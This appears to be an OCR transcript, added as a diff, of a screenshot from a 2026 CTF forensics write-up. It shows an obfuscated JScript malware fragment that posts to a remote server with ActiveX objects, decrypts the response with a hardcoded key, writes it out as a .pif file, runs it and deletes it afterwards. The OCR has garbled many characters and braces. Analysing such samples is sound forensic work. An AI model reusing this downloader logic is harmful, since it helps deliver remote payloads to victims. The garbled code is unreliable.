@@ -1,0 +1,22 @@
+# OCR: Pasted_image_20260414203948.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260414203948.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:43
+
+142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168
+function XBL3(B TG)
+var YIme = wyKN + LIxF.substring(o, LIxF.length - 2) + "pif":
+var Kpxo = new Activexobject("MSxML2.XMLHTTp"): Kpxo.oPEN("post"B TG,false):
+Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.8 (Windows NT 6.1; Win64; x64); " + Sz8k()): Kpxo.SETREQUESTHEADER("content-type:","application/octet-stream")
+Kpxo.SETREQUESTHEADER("content-length:"，"4"); Kpxo.SEND("work") :
+if (OUiy.FILEEXISTS(YIme))
+QUjy .DELETEFILE(YIme) : if (KpX0.STATUS == 200) 1
+Var m3mH = new ActiveXObject("ADODB.STREAM"):
+m3mH.TYPE = 1; m3mH.OPEN()
+m3mH.WRITE(Kpxo.responseBody):
+m3mH.Position = 0; m3mH.Type = 2;
+m3mH.CharSet = "437":
+var coxi = m3mH.ReadText(m3mH.size) :
+var ptFo = FXx9("2f532d6baec3doec7b1f98aed4774843", cz_b(c0xi)); NoRs(ptFO, YIme): m3mH.close(O): 1
+var ruGx = Tfoh(): c5ae(YIme,B_TG);
+wscript.sleep(30000): QUjy .DELETEFILE(YIme):
